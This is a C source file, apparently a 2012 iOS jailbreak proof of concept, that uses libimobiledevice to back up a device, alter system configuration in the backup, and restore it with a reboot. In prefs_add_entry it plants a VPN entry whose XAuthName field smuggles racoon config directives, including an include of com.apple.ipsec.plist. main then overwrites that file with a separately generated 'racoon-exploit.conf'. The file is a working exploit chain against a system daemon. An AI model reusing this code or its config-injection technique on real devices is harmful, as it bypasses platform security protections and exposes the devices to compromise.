/**
 * POC: injecting a config file via mobilebackup2
 *  without the need of making a complete backup
 *
 * Copyright (C) 2012 Chronic-Dev Team
 * Copyright (C) 2012 Nikias Bassen
 *
 * Chronic-Dev POC license :P
**/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <errno.h>
#include <signal.h>

#include <libimobiledevice/libimobiledevice.h>
#include <libimobiledevice/lockdown.h>
#include <libimobiledevice/afc.h>
#include <libimobiledevice/sbservices.h>

#include "idevicebackup2.h"
#include "backup.h"
#include "rop.h"

#define CONNECTION_NAME "jailbreak"

static int quit_flag = 0;

/* mkdir helper */
int __mkdir(const char* path, int mode) /*{{{*/
{
#ifdef WIN32
	return mkdir(path);
#else
	return mkdir(path, mode);
#endif
} /*}}}*/

/* recursively remove path, including path */
static void rmdir_recursive(const char *path) /*{{{*/
{
	if (!path) {
		return;
	}
	DIR* cur_dir = opendir(path);
	if (cur_dir) {
		struct dirent* ep;
		while ((ep = readdir(cur_dir))) {
			if ((strcmp(ep->d_name, ".") == 0) || (strcmp(ep->d_name, "..") == 0)) {
				continue;
			}
			char *fpath = (char*)malloc(strlen(path)+1+strlen(ep->d_name)+1);
			if (fpath) {
				struct stat st;
				strcpy(fpath, path);
				strcat(fpath, "/");
				strcat(fpath, ep->d_name);

				if ((stat(fpath, &st) == 0) && S_ISDIR(st.st_mode)) {
					rmdir_recursive(fpath);
				} else {
					if (remove(fpath) != 0) {
						fprintf(stderr, "could not remove file %s: %s\n", fpath, strerror(errno));
					}
				}
				free(fpath);
			}
		}
		closedir(cur_dir);
	}
	if (rmdir(path) != 0) {
		fprintf(stderr, "could not remove directory %s: %s\n", path, strerror(errno));
	}
} /*}}}*/

/* char** freeing helper function */
static void free_dictionary(char **dictionary) /*{{{*/
{
	int i = 0;

	if (!dictionary)
		return;

	for (i = 0; dictionary[i]; i++) {
		free(dictionary[i]);
	}
	free(dictionary);
} /*}}}*/

/* recursively remove path via afc, (incl = 1 including path, incl = 0, NOT including path) */
static int rmdir_recursive_afc(afc_client_t afc, const char *path, int incl) /*{{{*/
{
	char **dirlist = NULL;
	if (afc_read_directory(afc, path, &dirlist) != AFC_E_SUCCESS) {
		//fprintf(stderr, "AFC: could not get directory list for %s\n", path);
		return -1;
	}
	if (dirlist == NULL) {
		if (incl) {
			afc_remove_path(afc, path);
		}
		return 0;
	}

	char **ptr;
	for (ptr = dirlist; *ptr; ptr++) {
		if ((strcmp(*ptr, ".") == 0) || (strcmp(*ptr, "..") == 0)) {
			continue;
		}
		char **info = NULL;
		char *fpath = (char*)malloc(strlen(path)+1+strlen(*ptr)+1);
		strcpy(fpath, path);
		strcat(fpath, "/");
		strcat(fpath, *ptr);
		if ((afc_get_file_info(afc, fpath, &info) != AFC_E_SUCCESS) || !info) {
			// failed. try to delete nevertheless.
			afc_remove_path(afc, fpath);
			free(fpath);
			free_dictionary(info);
			continue;
		}

		int is_dir = 0;
		int i;
		for (i = 0; info[i]; i+=2) {
			if (!strcmp(info[i], "st_ifmt")) {
				if (!strcmp(info[i+1], "S_IFDIR")) {
					is_dir = 1;
				}
				break;
			}
		}
		free_dictionary(info);

		if (is_dir) {
			rmdir_recursive_afc(afc, fpath, 0);
		}
		afc_remove_path(afc, fpath);
		free(fpath);
	}

	free_dictionary(dirlist);
	if (incl) {
		afc_remove_path(afc, path);
	}

	return 0;
} /*}}}*/

int connected = 0;

static void idevice_event_cb(const idevice_event_t *event, void *user_data)
{
	char* udid = (char*)user_data;
	printf("device event %d: %s\n", event->event, event->udid);
	if (udid && strcmp(udid, event->udid)) return;
	if (event->event == IDEVICE_DEVICE_ADD) {
		connected = 1;
	} else if (event->event == IDEVICE_DEVICE_REMOVE) {
		connected = 0;
	}
}

static int get_rand(int min, int max) /*{{{*/
{
	int retval = (rand() % (max - min)) + min;
	return retval;
} /*}}}*/

static char *generate_guid() /*{{{*/
{
	char *guid = (char *) malloc(sizeof(char) * 37);
	const char *chars = "ABCDEF0123456789";
	srand(time(NULL));
	int i = 0;

	for (i = 0; i < 36; i++) {
		if (i == 8 || i == 13 || i == 18 || i == 23) {
			guid[i] = '-';
			continue;
		} else {
			guid[i] = chars[get_rand(0, 16)];
		}
	}
	guid[36] = '\0';
	return guid;
} /*}}}*/

static void prefs_remove_entry_if_present(plist_t* pl) /*{{{*/
{
	char* guid = NULL;
	plist_dict_iter iter = NULL;
	plist_t ns = plist_dict_get_item(*pl, "NetworkServices");
	if (!ns || (plist_get_node_type(ns) != PLIST_DICT)) {
		fprintf(stderr, "no NetworkServices node?!\n");
		return;
	}
	plist_dict_new_iter(ns, &iter);
	if (iter) {
		int found = 0;
		plist_t n = NULL;
		char* key = NULL;
		do {
			plist_dict_next_item(ns, iter, &key, &n);
			if (key && (plist_get_node_type(n) == PLIST_DICT)) {
				plist_t uname = plist_dict_get_item(n, "UserDefinedName");
				if (uname && (plist_get_node_type(uname) == PLIST_STRING)) {
					char *uname_str = NULL;
					plist_get_string_val(uname, &uname_str);
					if (uname_str) {
						if (strcmp(uname_str, CONNECTION_NAME) == 0) {
							// entry found
							found++;
							guid = strdup(key);
							printf("removing /NetworkServices/%s (UserDefinedName: %s)\n", key, uname_str);
							plist_dict_remove_item(ns, guid);
						}
						free(uname_str);
					}
				}
			}
			if (key) {
				free(key);
				key = NULL;
			}
		} while (n && !found);
		free(iter);
	}

	if (!guid) {
		// not found. just exit
		fprintf(stderr, "no entry found\n");
		return;
	}

	plist_t sets = plist_dict_get_item(*pl, "Sets");
	if (!sets || (plist_get_node_type(sets) != PLIST_DICT)) {
		fprintf(stderr, "no Sets node?!\n");
		free(guid);
		return;
	}

	iter = NULL;
	plist_dict_new_iter(sets, &iter);
	if (iter) {
		int found = 0;
		plist_t n = NULL;
		char* key = NULL;
		do {
			plist_dict_next_item(sets, iter, &key, &n);
			if (key && (plist_get_node_type(n) == PLIST_DICT)) {
				plist_t nn = plist_access_path(n, 3, "Network", "Service", guid);
				if (nn) {
					nn = plist_access_path(n, 2, "Network", "Service");
					if (nn) {
						fprintf(stderr, "removing /Sets/%s/Network/Service/%s\n", key, guid);
						plist_dict_remove_item(nn, guid);
					}
				}
				nn = plist_access_path(n, 4, "Network", "Global", "IPv4", "ServiceOrder");
				if (nn && (plist_get_node_type(nn) == PLIST_ARRAY)) {
					int32_t num = (int32_t)plist_array_get_size(nn);
					int32_t x;
					for (x = num-1; x >= 0; x--) {
						plist_t nnn = plist_array_get_item(nn, x);
						char* val = NULL;
						if (plist_get_node_type(nnn) == PLIST_KEY) {
							plist_get_key_val(nnn, &val);
						} else if (plist_get_node_type(nnn) == PLIST_STRING) {
							plist_get_string_val(nnn, &val);
						}
						if (val) {
							if (strcmp(val, guid) == 0) {
								free(val);
								fprintf(stderr, "removing /Sets/%s/Network/Global/IPv4/ServiceOrder/%s\n", key, guid);
								plist_array_remove_item(nn, x);
								break;
							}
							free(val);
						}
					}
				}
			}
			if (key) {
				free(key);
				key = NULL;
			}
		} while (n);
		free(iter);
	}
	free(guid);
} /*}}}*/

static void prefs_add_entry(plist_t* pl) /*{{{*/
{
	plist_t dict = NULL;
	plist_t arr = NULL;

	// construct connection data 
	plist_t conn = plist_new_dict();

	// DNS
	plist_dict_insert_item(conn, "DNS", plist_new_dict());

	// UserDefinedName
	plist_dict_insert_item(conn, "UserDefinedName", plist_new_string(CONNECTION_NAME));

	// IPv4
	dict = plist_new_dict();
	plist_dict_insert_item(dict, "ConfigMethod", plist_new_string("Automatic"));
	plist_dict_insert_item(dict, "OverridePrimary", plist_new_uint(1));
	plist_dict_insert_item(conn, "IPv4", dict);

	// payload
	plist_dict_insert_item(conn, "com.apple.payload", plist_new_dict());

	// Interface
	dict = plist_new_dict();
	plist_dict_insert_item(dict, "Type", plist_new_string("IPSec"));
	plist_dict_insert_item(conn, "Interface", dict);

	// Proxies
	dict = plist_new_dict();
	plist_dict_insert_item(dict, "FTPPassive", plist_new_uint(1));
	arr = plist_new_array();
	plist_array_append_item(arr, plist_new_string("*.local"));
	plist_array_append_item(arr, plist_new_string("169.254/16"));
	plist_dict_insert_item(dict, "ExceptionList", arr);
	plist_dict_insert_item(conn, "Proxies", dict);

	// IPSec
	dict = plist_new_dict();
	plist_dict_insert_item(dict, "AuthenticationMethod", plist_new_string("SharedSecret"));
	plist_dict_insert_item(dict, "RemoteAddress", plist_new_string("127.0.0.1"));
	plist_dict_insert_item(dict, "LocalIdentifier", plist_new_string("2"));
	plist_dict_insert_item(dict, "XAuthName", plist_new_string("pod2g\"; proposal {authentication_method xauth_psk_client; hash_algorithm sha1; encryption_algorithm aes 256; lifetime time 3600 sec; dh_group 2;} } include \"/private/var/preferences/SystemConfiguration/com.apple.ipsec.plist"));
	plist_dict_insert_item(dict, "LocalIdentifierType", plist_new_string("KeyID"));
	plist_dict_insert_item(dict, "XAuthEnabled", plist_new_uint(1));
	plist_dict_insert_item(dict, "SharedSecretEncryption", plist_new_string("Key"));
	plist_dict_insert_item(dict, "SharedSecret", plist_new_string("pod2g"));
	plist_dict_insert_item(conn, "IPSec", dict);

	// IPv6	
	plist_dict_insert_item(conn, "IPv6", plist_new_dict());	

	// get NetworkServices node
	plist_t ns = plist_dict_get_item(*pl, "NetworkServices");
	if (!ns || (plist_get_node_type(ns) != PLIST_DICT)) {
		fprintf(stderr, "ERROR: no NetworkServices node?!\n");
		return;
	}

	// get current set
	plist_t cset = plist_dict_get_item(*pl, "CurrentSet");
	if (!cset || (plist_get_node_type(cset) != PLIST_STRING)) {
		fprintf(stderr, "ERROR: no CurrentSet node found\n");
		return;
	}

	char* curset = NULL;
	plist_get_string_val(cset, &curset);
	if (!curset || (memcmp(curset, "/Sets/", 6) != 0)) {
		fprintf(stderr, "ERROR: CurrentSet has unexpected string value '%s'\n", (curset) ? "(null)" : curset);
		if (curset) {
			free(curset);
		}
		return;
	}

	// locate /Sets/{SetGUID}/Network/Service node
	plist_t netsvc = plist_access_path(*pl, 4, "Sets", curset+6, "Network", "Service");
	if (!netsvc) {
		fprintf(stderr, "ERROR: Could not access /Sets/%s/Network/Service node\n", curset+6);
		free(curset);
		return;
	}

	// locate /Sets/{SetGUID}/Network/Global/IPv4/ServiceOrder node
	plist_t order = plist_access_path(*pl, 6, "Sets", curset+6, "Network", "Global", "IPv4", "ServiceOrder");
	if (!order) {
		fprintf(stderr, "ERROR: Could not access /Sets/%s/Network/Global/IPv4/ServiceOrder node\n", curset+6);
		free(curset);
		return;
	}
	free(curset);

	// make sure we don't have a collision (VERY unlikely, but how knows)
	char* guid = generate_guid();
	while (plist_dict_get_item(ns, guid)) {
		free(guid);
		guid = generate_guid();
	}

	// add connection to /NetworkServices/{GUID}
	plist_dict_insert_item(ns, guid, conn);

	// add {GUID} to /Sets/{SetGUID}/Network/Global/IPv4/ServiceOrder/
	plist_array_append_item(order, plist_new_string(guid));

	// add {GUID} link dict to /Sets/{SetGUID}/Network/Service/
	char *linkstr = malloc(17+strlen(guid)+1);
	strcpy(linkstr, "/NetworkServices/");
	strcat(linkstr, guid);
	dict = plist_new_dict();
	plist_dict_insert_item(dict, "__LINK__", plist_new_string(linkstr));
	free(linkstr);
	plist_dict_insert_item(netsvc, guid, dict);

	// done	
	free(guid);
} /*}}}*/

static void process_preferences_plist(plist_t* pl)
{
	printf("Checking preferences.plist and removing any previous entry\n");
	prefs_remove_entry_if_present(pl);
	printf("Adding new entry\n");
	prefs_add_entry(pl);
	printf("done\n");
}

#define BKPTMP "nirvana"
#define AFCTMP "HackStore"

static void clean_exit(int sig)
{
	quit_flag++;
	idevicebackup2_set_clean_exit(quit_flag);
}

int main(int argc, char** argv)
{
	idevice_t device = NULL;
	lockdownd_client_t lckd = NULL;
	afc_client_t afc = NULL;
	uint16_t port = 0;
	char* udid = NULL;
	int dscs = 0;

	/* we need to exit cleanly on running backups and restores or we cause havok */
	signal(SIGINT, clean_exit);
	signal(SIGTERM, clean_exit);
#ifndef WIN32	
	signal(SIGQUIT, clean_exit);
	signal(SIGPIPE, SIG_IGN);
#endif

	//ropMain(dscs); // this writes racoon-exploit.conf to disk

	if (IDEVICE_E_SUCCESS != idevice_new(&device, NULL)) {
		printf("No device found, is it plugged in?\n");
		return -1;
	}

	if (IDEVICE_E_SUCCESS == idevice_get_udid(device, &udid)) {
		printf("DeviceUniqueID : %s\n", udid);
	}

	idevice_free(device);
	device = NULL;

	idevice_event_subscribe(idevice_event_cb, udid);

	int retries = 20;
	int i = 0;
	while (!connected && (i++ < retries)) {
		sleep(1);
	}

	if (!connected) {
		fprintf(stderr, "ERROR: Device connection failed\n");
		return -1;
	}

	if (IDEVICE_E_SUCCESS != idevice_new(&device, udid)) {
		printf("No device found, is it plugged in?\n");
		return -1;
	}

	if (LOCKDOWN_E_SUCCESS != lockdownd_client_new_with_handshake(device, &lckd, "mb2hackup")) {
		idevice_free(device);
		printf("Error connecting to lockdownd.\n");
		return -1;
	}

	lockdownd_start_service(lckd, "com.apple.afc", &port);
	if (!port) {
		lockdownd_client_free(lckd);
		idevice_free(device);
		printf("Error starting AFC service\n");
		return -1;
	}

	afc_client_new(device, port, &afc);
	if (!afc) {
		lockdownd_client_free(lckd);
		idevice_free(device);
		printf("Could not connect to AFC\n");
		return -1;
	}
	lockdownd_client_free(lckd);
	lckd = NULL;

	// check if directory exists
	char** list = NULL;
	if (afc_read_directory(afc, "/"AFCTMP, &list) != AFC_E_SUCCESS) {
		// we're good, directory does not exist.
	} else {
		free_dictionary(list);
		fprintf(stderr, "ERROR: the directory '%s' already exists. This is most likely a failed attempt to use this code...\n", AFCTMP);
		goto fix;
	}

	afc_make_directory(afc, "/"AFCTMP);

	printf("moving files aside...\n");
	afc_rename_path(afc, "/Books", "/"AFCTMP"/Books");
	afc_rename_path(afc, "/DCIM", "/"AFCTMP"/DCIM");
	afc_rename_path(afc, "/PhotoData", "/"AFCTMP"/PhotoData");
	afc_rename_path(afc, "/Photos", "/"AFCTMP"/Photos");
	afc_rename_path(afc, "/Recordings", "/"AFCTMP"/Recordings");
	// TODO other paths?

	afc_client_free(afc);
	afc = NULL;
	idevice_free(device);
	device = NULL;

	rmdir_recursive(BKPTMP);
	__mkdir(BKPTMP, 0755);

	char *bargv[] = {
		"idevicebackup2",
		"backup",
		BKPTMP,
		NULL
	};
	int bargc = 3;

	idevicebackup2(bargc, bargv);

	backup_t* backup = backup_open(BKPTMP, udid);
	if (!backup) {
		fprintf(stderr, "ERROR: failed to open backup\n");
		return -1;
	}

	// mess up the backup :D
	/*
	char ipsec_plist[] =
		"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
		"<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" \"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
		"<plist version=\"1.0\">\n"
		"<dict>\n"
		"  <key>Global</key>\n"
		"  <dict>\n"
		"    <key>DebugLevel</key>\n"
		"    <integer>2</integer>\n"
		"    <key>DebugLogfile</key>\n"
		"    <string>/private/var/log/racoon.log</string>\n"
		"  </dict>\n"
		"</dict>\n"
		"</plist>\n";
	*/

	backup_file_t* bf = NULL;
	char* ipsec_plist = NULL;
	int ipsec_plist_size = 0;
	file_read("racoon-exploit.conf", &ipsec_plist, &ipsec_plist_size);
	if(ipsec_plist != NULL && ipsec_plist_size > 0) {
		/*
		 * com.apple.ipsec.plist
		 */
		bf = backup_get_file(backup, "SystemPreferencesDomain", "SystemConfiguration/com.apple.ipsec.plist");
		if (bf) {
			fprintf(stderr, "com.apple.ipsec.plist already present, replacing\n");
			backup_file_assign_file_data(bf, ipsec_plist, strlen(ipsec_plist), 0);
			backup_file_set_length(bf, strlen(ipsec_plist));
			backup_file_update_hash(bf);

			if (backup_update_file(backup, bf) < 0) {
				fprintf(stderr, "ERROR: could not add file to backup\n");
			} else {
				backup_write_mbdb(backup);
			}
		} else {
			fprintf(stderr, "adding com.apple.ipsec.plist\n");
			bf = backup_file_create_with_data(ipsec_plist, strlen(ipsec_plist), 0);
			backup_file_set_domain(bf, "SystemPreferencesDomain");
			backup_file_set_path(bf, "SystemConfiguration/com.apple.ipsec.plist");
			backup_file_set_mode(bf, 0100644);
			backup_file_set_inode(bf, 123456);
			backup_file_set_uid(bf, 0);
			backup_file_set_gid(bf, 0);
			unsigned int tm = (unsigned int)(time(NULL));
			backup_file_set_time1(bf, tm);
			backup_file_set_time2(bf, tm);
			backup_file_set_time3(bf, tm);
			backup_file_set_length(bf, strlen(ipsec_plist));
			backup_file_set_flag(bf, 4);
			backup_file_update_hash(bf);

			if (backup_update_file(backup, bf) < 0) {
				fprintf(stderr, "ERROR: could not add file to backup\n");
			} else {
				backup_write_mbdb(backup);
			}
		}
		backup_file_free(bf);
	}

	/*
	 * prefrences.plist
	 */
	bf = backup_get_file(backup, "SystemPreferencesDomain", "SystemConfiguration/preferences.plist");
	if (bf) {
		char* fn = backup_get_file_path(backup, bf);
		if (!fn) {
			fprintf(stderr, "Huh, backup path for preferences.plist not found?!\n");
			return -1;
		}

		unsigned char* prefs = NULL;
		uint32_t plen = 0;

		if (file_read(fn, &prefs, &plen) > 8) {
			plist_t pl = NULL;
			if (memcmp(prefs, "bplist00", 8) == 0) {
				plist_from_bin(prefs, plen, &pl);
			} else {
				plist_from_xml(prefs, plen, &pl);
			}
			free(prefs);
			plen = 0;
			prefs = NULL;

			process_preferences_plist(&pl);

			plist_to_bin(pl, (char**)&prefs, &plen);

			backup_file_assign_file_data(bf, prefs, plen, 1);
			free(prefs);
			prefs = NULL;
			backup_file_set_length(bf, plen);
			backup_file_update_hash(bf);

			if (backup_update_file(backup, bf) < 0) {
				fprintf(stderr, "ERROR: could not add file to backup\n");
			} else {
				backup_write_mbdb(backup);
			}
		} else {
			fprintf(stderr, "Could not open '%s'\n", fn);
		}
	} else {
		fprintf(stderr, "ERROR: could not locate preferences.plist in backup.\n");
	}
	backup_file_free(bf);

	backup_free(backup);

	char* rargv[] = {
		"idevicebackup2",
		"restore",
		"--system",
		"--settings",
		"--reboot",
		BKPTMP,
		NULL
	};
	int rargc = 6;

	idevicebackup2(rargc, rargv);

	printf("waiting for device reboot\n");

	// wait for disconnect
	while (connected) {
		sleep(2);
	}

	printf("Device %s disconnected\n", udid);

	// wait for device to connect
	while (!connected) {
		sleep(2);
	}
	idevice_event_unsubscribe();
	printf("Device %s detected. Connecting...\n", udid);
	sleep(2);

	device = NULL;
	if (IDEVICE_E_SUCCESS != idevice_new(&device, udid)) {
		printf("Reconnect to %s failed... whoops\n", udid);
		return -1;
	}

	if (LOCKDOWN_E_SUCCESS != lockdownd_client_new_with_handshake(device, &lckd, "mb2hackup")) {
		idevice_free(device);
		printf("Error connecting to lockdownd.\n");
		return -1;
	}

	port = 0;
	lockdownd_start_service(lckd, "com.apple.afc", &port);
	if (!port) {
		lockdownd_client_free(lckd);
		idevice_free(device);
		printf("Error starting AFC service\n");
		return -1;
	}

	afc_client_new(device, port, &afc);
	if (!afc) {
		lockdownd_client_free(lckd);
		idevice_free(device);
		printf("Could not connect to AFC\n");
		return -1;
	}

	printf("moving back files...\n");

	list = NULL;
	if (afc_read_directory(afc, "/"AFCTMP, &list) != AFC_E_SUCCESS) {
		fprintf(stderr, "Uh, oh, the folder '%s' does not exist or is not accessible...\n", AFCTMP);
	}

	i = 0;
	while (list && list[i]) {
		if (!strcmp(list[i], ".") || !strcmp(list[i], "..")) {
			i++;
			continue;
		}
		printf("%s\n", list[i]);

		char* tmpname = (char*)malloc(1+strlen(list[i])+1);
		strcpy(tmpname, "/");
		strcat(tmpname, list[i]);
		rmdir_recursive_afc(afc, tmpname, 1);

		char* tmxname = (char*)malloc(1+strlen(AFCTMP)+1+strlen(list[i])+1);
		strcpy(tmxname, "/"AFCTMP"/");
		strcat(tmxname, list[i]);

		printf("moving %s to %s\n", tmxname, tmpname);
		afc_rename_path(afc, tmxname, tmpname);

		free(tmxname);
		free(tmpname);

		i++;
	}
	free_dictionary(list);

	printf("waiting for device to finish booting...\n");

	retries = 100;
	int done = 0;
	sbservices_client_t sbsc = NULL;
	plist_t state = NULL;

	while (!done && (retries-- > 0)) {
		port = 0;
		lockdownd_start_service(lckd, "com.apple.springboardservices", &port);
		if (!port) {
			continue;
		}
		sbsc = NULL;
		sbservices_client_new(device, port, &sbsc);
		if (!sbsc) {
			continue;
		}
		if (sbservices_get_icon_state(sbsc, &state, "2") == SBSERVICES_E_SUCCESS) {
			plist_free(state);
			state = NULL;
			done = 1;
		}
		sbservices_client_free(sbsc);
		if (done) {
			printf("bootup complete\n");
			break;
		}
		sleep(3);
	}
	lockdownd_client_free(lckd);
	lckd = NULL;

fix:
	printf("moving back any leftovers...\n");

	list = NULL;
	if (afc_read_directory(afc, "/"AFCTMP, &list) != AFC_E_SUCCESS) {
		//fprintf(stderr, "Uh, oh, the folder '%s' does not exist or is not accessible...\n", AFCTMP);
	}

	i = 0;
	while (list && list[i]) {
		if (!strcmp(list[i], ".") || !strcmp(list[i], "..")) {
			i++;
			continue;
		}
		printf("%s\n", list[i]);

		char* tmpname = (char*)malloc(1+strlen(list[i])+1);
		strcpy(tmpname, "/");
		strcat(tmpname, list[i]);
		rmdir_recursive_afc(afc, tmpname, 1);

		char* tmxname = (char*)malloc(1+strlen(AFCTMP)+1+strlen(list[i])+1);
		strcpy(tmxname, "/"AFCTMP"/");
		strcat(tmxname, list[i]);

		printf("moving %s to %s\n", tmxname, tmpname);
		afc_rename_path(afc, tmxname, tmpname);

		free(tmxname);
		free(tmpname);

		i++;
	}
	free_dictionary(list);

	printf("cleaning up\n");
	afc_remove_path(afc, "/"AFCTMP);
	if (afc_read_directory(afc, "/"AFCTMP, &list) == AFC_E_SUCCESS) {
		fprintf(stderr, "WARNING: the folder /"AFCTMP" is still present in the user's Media folder. You have to check yourself for any leftovers and move them back if required.\n");
	}

	rmdir_recursive(BKPTMP);

	printf("done!\n");

leave:
	afc_client_free(afc);
	afc = NULL;
	idevice_free(device);
	device = NULL;
	free(udid);

	return 0;
}
